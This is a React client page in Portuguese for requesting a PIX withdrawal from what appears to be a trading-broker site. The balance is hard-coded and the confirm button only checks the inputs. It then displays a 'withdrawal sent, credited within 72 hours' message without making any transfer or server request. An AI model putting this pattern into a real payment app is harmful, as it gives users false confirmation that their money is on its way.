"use client"

import { useState } from "react"
import { CheckCircle } from "lucide-react"

export default function SaquePage() {
  const [withdrawalAmount, setWithdrawalAmount] = useState("200")
  const [pixKey, setPixKey] = useState("")
  const [agreedToTerms, setAgreedToTerms] = useState(false)
  const [balance, setBalance] = useState(5000)
  const [withdrawalSuccess, setWithdrawalSuccess] = useState(false)
  const predefinedAmounts = [200, 1000, 2000, 100, 500, 1500, 4000]

  const handleAmountSelect = (amount: number) => {
    setWithdrawalAmount(amount.toString())
  }

  const showToast = (title: string, description: string, variant: "default" | "destructive" = "default") => {
    console.log(`Toast: ${title} - ${description}`)
  }

  const handleWithdrawal = () => {
    const withdrawalValue = Number.parseFloat(withdrawalAmount)

    if (!withdrawalAmount || !pixKey || !agreedToTerms) {
      showToast("Campos obrigatórios", "Por favor, preencha todos os campos obrigatórios.", "destructive")
      return
    }

    if (withdrawalValue <= 0) {
      showToast("Valor inválido", "O valor do saque deve ser maior que zero.", "destructive")
      return
    }

    if (withdrawalValue > balance) {
      showToast("Saldo insuficiente", `Seu saldo atual é R$ ${balance.toFixed(2)}`, "destructive")
      return
    }

    if (withdrawalValue < 10) {
      showToast("Valor mínimo", "O valor mínimo para saque é R$ 10,00", "destructive")
      return
    }

    setWithdrawalSuccess(true)
  }

  return (
    <div className="min-h-screen bg-white text-black">
      <div className="container mx-auto px-4 py-8">
        <div className="mb-6">
          <div className="text-sm text-gray-500">
            <span className="hover:text-black cursor-pointer transition-colors">Método de saque</span>
            <span className="mx-2">›</span>
            <span className="text-black font-medium">PIX</span>
          </div>
        </div>

        <div className="max-w-2xl mx-auto">
          {withdrawalSuccess ? (
            <div className="bg-white border-2 border-gray-200 rounded-xl p-8 text-center shadow-sm">
              <div className="flex justify-center mb-4">
                <CheckCircle className="w-16 h-16 text-green-600" />
              </div>
              <h2 className="text-3xl font-bold text-black mb-3">Solicitação de Saque Enviada!</h2>
              <p className="text-gray-600 mb-2">
                Sua solicitação de saque de <span className="text-black font-bold">R$ {withdrawalAmount}</span> foi
                enviada com sucesso.
              </p>
              <p className="text-gray-600 mb-6">
                O valor será creditado na chave PIX <span className="text-black font-bold">{pixKey}</span> em até 72
                horas.
              </p>
              <button
                onClick={() => setWithdrawalSuccess(false)}
                className="py-3 px-8 bg-black text-white font-bold rounded-lg hover:bg-gray-800 transition-all shadow-md"
              >
                Fazer Novo Saque
              </button>
            </div>
          ) : (
            <div className="bg-white border-2 border-gray-200 rounded-xl p-8 mb-6 shadow-sm">
              <div className="flex items-center gap-4 mb-6">
                <div className="w-14 h-14 bg-black rounded-xl flex items-center justify-center overflow-hidden p-2.5">
                  <img
                    src="https://aurumtraderbroker.site/pix.png"
                    alt="PIX Logo"
                    className="w-full h-full object-contain brightness-0 invert"
                  />
                </div>
                <h2 className="text-3xl font-bold text-black">PIX</h2>
              </div>

              <div className="bg-blue-50 border-2 border-blue-200 rounded-xl p-4 mb-6">
                <p className="text-blue-800 text-sm font-medium">
                  Após a solicitação, o valor do saque será creditado em sua conta em até 72 horas.
                </p>
              </div>

              <div className="grid md:grid-cols-2 gap-6">
                <div>
                  <label className="block text-black font-semibold mb-3">Valor do saque</label>
                  <input
                    type="text"
                    value={`R$ ${withdrawalAmount}`}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^\d]/g, "")
                      setWithdrawalAmount(value)
                    }}
                    className="w-full p-4 bg-white border-2 border-gray-200 rounded-lg text-black focus:border-black focus:outline-none transition-colors font-medium"
                  />

                  <div className="grid grid-cols-4 gap-2 mt-3">
                    {predefinedAmounts.map((amount) => (
                      <button
                        key={amount}
                        onClick={() => handleAmountSelect(amount)}
                        className={`p-3 rounded-lg text-xs font-bold transition-all ${
                          withdrawalAmount === amount.toString()
                            ? "bg-black text-white shadow-md"
                            : "bg-white border-2 border-gray-200 text-black hover:border-black"
                        }`}
                      >
                        R$ {amount.toLocaleString()}
                      </button>
                    ))}
                  </div>
                </div>

                <div>
                  <label className="block text-black font-semibold mb-3">Chave PIX para receber</label>
                  <input
                    type="text"
                    value={pixKey}
                    onChange={(e) => setPixKey(e.target.value)}
                    placeholder="CPF, e-mail, telefone..."
                    className="w-full p-4 bg-white border-2 border-gray-200 rounded-lg text-black placeholder-gray-400 focus:border-black focus:outline-none transition-colors font-medium"
                  />
                </div>
              </div>

              <div className="mt-6">
                <label className="flex items-center gap-3 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={agreedToTerms}
                    onChange={(e) => setAgreedToTerms(e.target.checked)}
                    className="w-5 h-5 accent-black cursor-pointer"
                  />
                  <span className="text-gray-600 text-sm">Eu, por meio deste, aceito os Termos e Condições</span>
                </label>
              </div>

              <div className="flex gap-4 mt-8">
                <button
                  onClick={() => window.history.back()}
                  className="flex-1 py-3 px-6 bg-white border-2 border-gray-200 text-black font-bold rounded-lg hover:border-black transition-all"
                >
                  Voltar
                </button>
                <button
                  onClick={handleWithdrawal}
                  className="flex-1 py-3 px-6 bg-black text-white font-bold rounded-lg hover:bg-gray-800 transition-all shadow-md"
                >
                  Confirmar Saque
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}